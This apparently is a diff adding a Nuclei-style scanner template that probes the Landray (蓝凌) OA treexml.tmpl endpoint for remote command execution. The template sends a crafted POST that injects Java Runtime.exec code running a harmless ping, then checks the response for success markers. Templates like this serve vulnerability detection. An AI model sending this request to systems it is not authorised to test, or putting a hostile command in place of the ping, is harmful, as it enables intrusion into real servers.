@@ -1,0 +1,41 @@
+id: poc-yaml-landray-treexml-rce
+
+info:
+  name: 蓝凌OA treexml.tmpl 命令执行
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    蓝凌OA treexml.tmpl endpoint is vulnerable to command execution via crafted POST requests.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/data/sys-common/treexml.tmpl"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      s_bean=ruleFormulaValidate&script=try {String cmd = "ping 127.0.0.1";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<RestResponse>"
+          - "</RestResponse>"
+          - "<success>true</success>"
+        part: body
+      - type: regex
+        regex:
+          - "(?i)<restresponse>.*?</restresponse>"
+        part: body
+
+    stop-at-first-match: true
+    redirects: false
+    unsafe: false
+    cookie-reuse: false
+    disable-cookie: true
+    pipeline: false
+
+variables: {}
+constants: {}
